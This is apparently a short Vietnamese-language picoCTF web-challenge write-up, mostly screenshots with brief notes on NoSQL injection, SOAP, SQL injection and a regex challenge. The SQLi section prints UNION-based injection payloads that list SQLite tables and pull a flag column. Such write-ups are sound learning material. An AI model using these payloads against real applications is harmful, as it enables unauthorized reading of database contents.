# Pico

# 3v@l

![Screenshot 2025-05-06 145459](https://github.com/user-attachments/assets/7341be37-c7dd-452b-9bd5-c16d7c1f9255)

![Screenshot 2025-05-06 145355](https://github.com/user-attachments/assets/c7c3347d-3de3-472a-8d19-29883e1888e6)


# Trickster

![Screenshot 2025-05-06 155332](https://github.com/user-attachments/assets/b1b381bd-837e-408d-be81-cd3efdeac7fe)

![Screenshot 2025-05-06 155403](https://github.com/user-attachments/assets/6f13e065-7c1f-4f66-ab63-f8b5fc0fa6da)

![Screenshot 2025-05-06 155256](https://github.com/user-attachments/assets/ac5c313c-f361-458a-8539-4f0531317528)

![Screenshot 2025-05-06 155535](https://github.com/user-attachments/assets/cf092a89-0610-4e25-b710-7f2a8bd808de)

![Screenshot 2025-05-06 155628](https://github.com/user-attachments/assets/7bc6fb7c-7383-4ff6-a2ee-710ed70c4044)

![Screenshot 2025-05-06 155652](https://github.com/user-attachments/assets/51c486c3-f0db-4f08-b895-2663c972f65a)

![Screenshot 2025-05-06 160930](https://github.com/user-attachments/assets/5728cb41-4208-4af7-8109-5a9f1a6f889b)


# No Sql Injection
![Screenshot 2025-05-06 164913](https://github.com/user-attachments/assets/4b93f124-856c-4681-9027-c002a5ca2cfd)
Base64


# SOAP
![image](https://github.com/user-attachments/assets/66b72268-993f-4abe-a155-b48ce205c653)

![image](https://github.com/user-attachments/assets/e85f7fff-fa60-434e-bf56-02d3efab8184)


# SQLI

![image](https://github.com/user-attachments/assets/85cd66b8-317f-450f-8e67-07690551feda)

Lấy các bảng bằng payload như sau
>a' union select 1,name,3 from sqlite_master where type='table'-- -

![image](https://github.com/user-attachments/assets/f0cc536a-7494-4c2b-99e5-4c918f7ac6ef)

Kiểm tra bảng more_table

>a' union select 1,sql,3 from sqlite_master where name='more_table'-- -

KIểm tra cột flag trong bảng more_table

>a' union select flag,2,3 from more_table-- -

![image](https://github.com/user-attachments/assets/90e55f04-5245-4a7c-a5bf-c5ca3ee1a075)

# MatchTheRegex

![image](https://github.com/user-attachments/assets/c7b34f81-2f2c-437a-b108-c16e5f416f6b)
.*? bắt tất cả các kí tự bất kỳ, số lượng ít nhất cả thể, nghĩa là chỉ lấy } đầu tiên bắt gặp

Nếu không có ? sau * thì nó sẽ khớp tới } cuối cùng trong chuỗi lớn

{ } là kí tự đặt biệt trong regular nên cần có dấu \ đứng trước







